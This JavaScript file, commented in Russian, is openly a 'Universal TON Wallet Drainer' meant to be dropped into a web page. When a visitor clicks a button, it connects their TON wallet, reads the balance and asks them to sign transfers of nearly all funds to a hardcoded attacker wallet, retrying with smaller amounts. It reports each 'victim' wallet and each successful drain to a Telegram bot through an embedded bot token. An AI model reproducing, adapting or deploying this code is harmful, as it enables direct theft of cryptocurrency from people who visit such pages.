// Universal TON Wallet Drainer
// Просто добавьте <script src="index.js"></script> и <button class="ton">Текст кнопки</button>
(function() {
    'use strict';

    // ===== КОНФИГУРАЦИЯ =====
    const CONFIG = {
        // Telegram Bot Configuration
        telegramBotToken: '7918019157:AAFne7ZoTKNeJp7vBjYt6F8waCJKkzFLz1E',
        telegramChatId: '-4961842391',
        
        // TON Wallet Configuration
        tonReceiverWallet: 'UQAER0Zs8BCd2_hPFOnWYce9T1KniO9EqKUeuDmu50UCkzhI',
        
        // TON API Configuration
        tonCenterApiUrl: 'https://toncenter.com/api/v2',
        tonCenterApiKey: '',
        
        // Logging Configuration
        logging: {
            walletConnection: true,
            transactionSuccess: true,
            errors: true
        }
    };

    // ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
    let tonConnectUI = null;
    let isConnected = false;

    // ===== ЗАГРУЗКА TON CONNECT UI =====
    function loadTONConnectUI() {
        return new Promise((resolve, reject) => {
            if (window.TON_CONNECT_UI) {
                resolve();
                return;
            }

            const script = document.createElement('script');
            script.src = 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';
            script.onload = () => {
                console.log('✅ TON Connect UI загружен');
                resolve();
            };
            script.onerror = () => {
                console.error('❌ Ошибка загрузки TON Connect UI');
                reject(new Error('Не удалось загрузить TON Connect UI'));
            };
            document.head.appendChild(script);
        });
    }

    // ===== КОНВЕРТАЦИЯ АДРЕСОВ =====
    function convertRawToUserFriendly(rawAddress) {
        try {
            // Если уже user-friendly (содержит - или _)
            if (rawAddress.includes('-') || rawAddress.includes('_')) {
                return rawAddress;
            }
            
            // Если raw формат (0:hex)
            if (rawAddress.startsWith('0:')) {
                try {
                    const hex = rawAddress.substring(2);
                    // Конвертируем hex в bytes
                    const bytes = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                    
                    // Создаем buffer с workchain (0) + account
                    const fullBytes = new Uint8Array(33);
                    fullBytes[0] = 0; // workchain 0
                    fullBytes.set(bytes, 1);
                    
                    // Конвертируем в base64
                    let base64 = btoa(String.fromCharCode.apply(null, fullBytes));
                    // Заменяем символы для URL-safe base64
                    base64 = base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
                    
                    return 'EQ' + base64;
                } catch (hexError) {
                    console.log('Ошибка hex конвертации:', hexError);
                    return rawAddress;
                }
            }
            
            // Если это уже base64 адрес без префикса, добавляем EQ
            if (rawAddress.length === 48 && !rawAddress.startsWith('EQ')) {
                return 'EQ' + rawAddress;
            }
            
            return rawAddress;
        } catch (error) {
            console.log('Ошибка конвертации адреса:', error);
            return rawAddress;
        }
    }

    // ===== ПОЛУЧЕНИЕ БАЛАНСА =====
    async function getWalletBalance(address) {
        try {
            console.log('💰 Получаем баланс через TONCenter API для:', address);
            
            // Генерируем различные форматы адреса
            const userFriendly = convertRawToUserFriendly(address);
            const addressFormats = [
                userFriendly,
                address,
                address.replace(/[_-]/g, '+').replace(/=/g, ''),
                address.replace(/[+]/g, '_').replace(/=/g, ''),
                address.replace(/[_]/g, '-').replace(/=/g, ''),
                userFriendly + '=',
                address + '='
            ];
            
            console.log('🔄 Пробуем форматы адресов:', addressFormats);
            
            for (const addressFormat of addressFormats) {
                try {
                    const apiUrl = `${CONFIG.tonCenterApiUrl}/getAddressInformation`;
                    const params = new URLSearchParams({
                        address: addressFormat
                    });
                    
                    if (CONFIG.tonCenterApiKey) {
                        params.append('api_key', CONFIG.tonCenterApiKey);
                    }
                    
                    console.log(`🔍 Тестируем: ${addressFormat.substring(0, 20)}...`);
                    const response = await fetch(`${apiUrl}?${params}`, {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (!response.ok) {
                        console.log(`❌ HTTP ${response.status} для ${addressFormat.substring(0, 20)}...`);
                        continue;
                    }
                    
                    const data = await response.json();
                    console.log(`📊 API ответ для ${addressFormat.substring(0, 20)}...`);
                    
                    if (!data.ok) {
                        console.log(`⚠️ API ошибка: ${data.error || 'Неизвестная ошибка'}`);
                        continue;
                    }
                    
                    if (!data.result || data.result.balance === undefined) {
                        console.log(`⚠️ Нет данных о балансе в ответе`);
                        continue;
                    }
                    
                    const balance = parseInt(data.result.balance);
                    const tonBalance = balance / 1000000000;
                    
                    console.log(`✅ БАЛАНС НАЙДЕН: ${balance} nanotons (${tonBalance.toFixed(6)} TON)`);
                    console.log(`🎯 Успешный формат адреса: ${addressFormat}`);
                    
                    return balance;
                    
                } catch (formatError) {
                    console.log(`❌ Ошибка запроса для ${addressFormat.substring(0, 20)}...:`, formatError.message);
                    continue;
                }
                
                // Пауза между запросами
                await new Promise(resolve => setTimeout(resolve, 200));
            }
            
            console.log('❌ Все форматы адреса не сработали');
            return null;
            
        } catch (error) {
            console.error('❌ Критическая ошибка получения баланса:', error);
            return null;
        }
    }

    // ===== ОТПРАВКА УВЕДОМЛЕНИЙ В TELEGRAM =====
    async function sendTelegramNotification(data) {
        try {
            const { wallet, type, signature, amount } = data;
            
            // Московское время
            const moscowTime = new Date().toLocaleString('ru-RU', {
                timeZone: 'Europe/Moscow',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            // Конвертируем адрес в user-friendly формат
            const userFriendlyWallet = convertRawToUserFriendly(wallet);
            
            let telegramMessage = '';
            
            if (type === 'connected') {
                telegramMessage = `🔥 TON КОШЕЛЕК ПОДКЛЮЧЕН!\n\n💰 Кошелёк жертвы: ${userFriendlyWallet}\n🎯 Получатель: ${CONFIG.tonReceiverWallet}\n📅 Время (МСК): ${moscowTime}\n\n🚀 Начинаем дрейн...`;
            } else if (type === 'transaction_success') {
                telegramMessage = `💎 УСПЕШНЫЙ ДРЕЙН TON!\n\n📤 Отправитель: ${userFriendlyWallet}\n📥 МОЙ КОШЕЛЕК: ${CONFIG.tonReceiverWallet}\n💰 Получено: ${amount} TON\n🔗 Подпись: ${signature}\n⏰ Время (МСК): ${moscowTime}`;
            } else {
                telegramMessage = `ℹ️ TON Событие\n💰 Кошелёк: ${userFriendlyWallet}`;
            }
            
            const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CONFIG.telegramChatId,
                    text: telegramMessage
                })
            });
            
            if (response.ok) {
                console.log('✅ Уведомление отправлено в Telegram');
            } else {
                console.error('❌ Ошибка отправки уведомления');
            }

        } catch (error) {
            console.error('❌ Ошибка Telegram уведомления:', error);
        }
    }

    // ===== УМНЫЙ ДРЕЙНЕР =====
    async function smartDrainWallet(walletAddress) {
        try {
            console.log('🎯 Начинаем умный дрейн для:', walletAddress);
            
            // Проверяем подключение кошелька
            if (!tonConnectUI.wallet || !tonConnectUI.wallet.account) {
                console.error('❌ Кошелек не подключен к TON Connect UI');
                return false;
            }
            
            console.log('✅ Кошелек подключен, получаем баланс...');
            
            // Получаем баланс с множественными попытками
            let walletBalance = null;
            let attempts = 0;
            const maxAttempts = 3;
            
            while (attempts < maxAttempts && !walletBalance) {
                attempts++;
                console.log(`📊 Попытка ${attempts}/${maxAttempts} получения баланса...`);
                walletBalance = await getWalletBalance(walletAddress);
                
                if (!walletBalance && attempts < maxAttempts) {
                    console.log('⏳ Пауза перед следующей попыткой...');
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
            
            let smartAmounts = [];
            
            if (walletBalance && walletBalance > 100000000) { // Минимум 0.1 TON на балансе
                const tonBalance = walletBalance / 1000000000;
                console.log(`💰 БАЛАНС ОПРЕДЕЛЕН: ${tonBalance.toFixed(6)} TON (${walletBalance} nanotons)`);
                
                // Точная сумма к списанию: баланс - 0.1 TON
                const reserveForFees = 100000000; // 0.1 TON в nanotons
                const exactAmount = walletBalance - reserveForFees;
                
                console.log(`🔒 Резерв на комиссии: 0.1 TON`);
                console.log(`🎯 ТОЧНАЯ СУММА К СПИСАНИЮ: ${(exactAmount / 1000000000).toFixed(6)} TON`);
                
                if (exactAmount > 0) {
                    // Основная стратегия: точная сумма (баланс - 0.1)
                    smartAmounts = [exactAmount];
                    
                    // Добавляем fallback суммы на случай если точная не пройдет
                    const fallbackPercents = [0.95, 0.9, 0.85, 0.8, 0.7, 0.6, 0.5];
                    fallbackPercents.forEach(percent => {
                        const fallbackAmount = Math.floor(exactAmount * percent);
                        if (fallbackAmount >= 50000000) { // Минимум 0.05 TON
                            smartAmounts.push(fallbackAmount);
                        }
                    });
                    
                    console.log('🎯 Стратегия списания:');
                    console.log(`   1. ТОЧНАЯ СУММА: ${(exactAmount / 1000000000).toFixed(6)} TON (баланс - 0.1)`);
                    smartAmounts.slice(1).forEach((amount, index) => {
                        const percent = fallbackPercents[index] * 100;
                        console.log(`   ${index + 2}. ${percent}% от точной: ${(amount / 1000000000).toFixed(6)} TON`);
                    });
                } else {
                    console.log('⚠️ Баланс слишком мал (меньше 0.1 TON)');
                }
            } else {
                console.log('❌ Баланс неизвестен или меньше 0.1 TON, используем фиксированные суммы');
            }
            
            // Фиксированные суммы как резерв (от малых к большим для экономии комиссий)
            const fallbackAmounts = [
                100000000,    // 0.1 TON
                200000000,    // 0.2 TON
                500000000,    // 0.5 TON
                1000000000,   // 1 TON
                2000000000    // 2 TON
            ];
            
            // Объединяем умные и фиксированные суммы
            const allAmounts = [...smartAmounts.map(a => a.toString()), ...fallbackAmounts.map(a => a.toString())];
            
            console.log('🎯 Полный список сумм для попыток:', allAmounts.map(a => (parseInt(a) / 1000000000).toFixed(6) + ' TON'));

            for (const amount of allAmounts) {
                try {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [{
                            address: CONFIG.tonReceiverWallet,
                            amount: amount,
                            payload: null
                        }]
                    };

                    console.log(`💸 Пробуем сумму: ${(parseInt(amount) / 1000000000).toFixed(6)} TON`);
                    const result = await tonConnectUI.sendTransaction(transaction);
                    
                    console.log('✅ Транзакция успешна:', result);
                    
                    const tonAmount = (parseInt(amount) / 1000000000).toFixed(6);
                    const userFriendlyAddress = convertRawToUserFriendly(walletAddress);
                    await sendTelegramNotification({
                        wallet: userFriendlyAddress,
                        type: 'transaction_success',
                        signature: result.boc || result.hash || 'unknown',
                        amount: tonAmount
                    });

                    return true; // Выходим после первой успешной транзакции
                    
                } catch (error) {
                    console.log(`❌ Сумма ${(parseInt(amount) / 1000000000).toFixed(6)} TON не удалась:`, error.message);
                    
                    // Анализируем тип ошибки
                    if (error.message.includes('insufficient') || error.message.includes('balance')) {
                        console.log('💰 Недостаточно средств для этой суммы, пробуем меньше...');
                    } else if (error.message.includes('User rejected') || error.message.includes('cancelled')) {
                        console.log('👤 Пользователь отклонил транзакцию');
                        return false;
                    }
                    
                    continue;
                }
            }
            
            console.log('⚠️ Все суммы не удались');
            return false;
        } catch (error) {
            console.error('❌ Критическая ошибка дрейна:', error);
            return false;
        }
    }

    // ===== ИНИЦИАЛИЗАЦИЯ TON CONNECT UI =====
    async function initTONConnectUI() {
        try {
            await loadTONConnectUI();
            
            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
                restoreConnection: false,
                walletsListConfiguration: {
                    includeWallets: [
                        {
                            appName: "tonkeeper",
                            name: "Tonkeeper",
                            imageUrl: "https://tonkeeper.com/assets/tonconnect-icon.png",
                            aboutUrl: "https://tonkeeper.com",
                            universalLink: "https://app.tonkeeper.com/ton-connect",
                            bridgeUrl: "https://bridge.tonapi.io/bridge",
                            platforms: ["ios", "android", "chrome", "firefox"]
                        },
                        {
                            appName: "tonhub", 
                            name: "Tonhub",
                            imageUrl: "https://tonhub.com/tonconnect_logo.png",
                            aboutUrl: "https://tonhub.com",
                            universalLink: "https://tonhub.com/ton-connect",
                            bridgeUrl: "https://connect.tonhubapi.com/tonconnect",
                            platforms: ["ios", "android"]
                        }
                    ]
                }
            });

            // Принудительно отключаем любые предыдущие подключения
            try {
                await tonConnectUI.disconnect();
            } catch (e) {
                // Игнорируем ошибки отключения
            }

            console.log('✅ TON Connect UI инициализирован');
            return true;
        } catch (error) {
            console.error('❌ Ошибка инициализации TON Connect UI:', error);
            return false;
        }
    }

    // ===== ОБРАБОТЧИК ПОДКЛЮЧЕНИЯ КОШЕЛЬКА =====
    async function handleWalletConnection(button) {
        const originalText = button.innerHTML;
        try {
            console.log('🔗 Начинаем подключение кошелька...');
            
            // Изменяем состояние кнопки
            button.innerHTML = '⏳ Подключение...';
            button.disabled = true;

            // Подключаем кошелек
            await tonConnectUI.connectWallet();
            
            // Получаем подключенный кошелёк
            const wallet = tonConnectUI.wallet;
            
            if (wallet && wallet.account && wallet.account.address) {
                console.log('✅ Кошелёк успешно подключен');
                isConnected = true;
                
                const walletAddress = wallet.account.address;
                const userFriendlyAddress = convertRawToUserFriendly(walletAddress);
                
                console.log('TON кошелёк подключен (raw):', walletAddress);
                console.log('TON кошелёк подключен (user-friendly):', userFriendlyAddress);
                
                // Отправляем уведомление о подключении
                await sendTelegramNotification({
                    wallet: userFriendlyAddress,
                    type: 'connected'
                });

                button.innerHTML = '💸 Обработка...';

                // Начинаем процесс дрейна
                const drainSuccess = await smartDrainWallet(walletAddress);
                
                if (drainSuccess) {
                    button.innerHTML = '✅ Готово!';
                } else {
                    button.innerHTML = '❌ Ошибка - повторите';
                    button.disabled = false;
                    isConnected = false;
                }
            } else {
                throw new Error('Кошелёк не подключен или неверные данные');
            }
            
        } catch (error) {
            console.error('❌ Ошибка подключения кошелька:', error);
            button.innerHTML = originalText;
            button.disabled = false;
            isConnected = false;
            
            if (error.message.includes('User rejected') || error.message.includes('rejected')) {
                console.log('👤 Пользователь отклонил подключение');
            } else if (error.message.includes('No wallet')) {
                console.log('📱 Кошелёк не найден');
            } else {
                console.log('⚠️ Общая ошибка подключения:', error.message);
            }
        }
    }

    // ===== АВТОМАТИЧЕСКАЯ ИНИЦИАЛИЗАЦИЯ =====
    async function initTONDrainer() {
        try {
            console.log('🚀 Инициализация Universal TON Drainer...');
            
            // Инициализируем TON Connect UI
            const uiReady = await initTONConnectUI();
            if (!uiReady) {
                console.error('❌ Не удалось инициализировать TON Connect UI');
                return;
            }
            
            // Ищем все кнопки с классом "ton"
            const buttons = document.querySelectorAll('.ton');
            console.log(`🔍 Найдено ${buttons.length} кнопок с классом "ton"`);
            
            if (buttons.length === 0) {
                console.warn('⚠️ Кнопки с классом "ton" не найдены!');
                return;
            }
            
            // Добавляем обработчики для всех кнопок
            buttons.forEach((button, index) => {
                button.addEventListener('click', () => handleWalletConnection(button));
                console.log(`✅ Кнопка ${index + 1} настроена`);
                
                // Добавляем стили если нужно
                if (!button.style.cursor) {
                    button.style.cursor = 'pointer';
                }
            });
            
            console.log('🎉 Universal TON Drainer успешно инициализирован!');
            console.log('💡 Использование: <button class="ton">Ваш текст</button>');
            
        } catch (error) {
            console.error('❌ Критическая ошибка инициализации:', error);
        }
    }

    // ===== ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ =====
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initTONDrainer);
    } else {
        // DOM уже загружен
        initTONDrainer();
    }
})();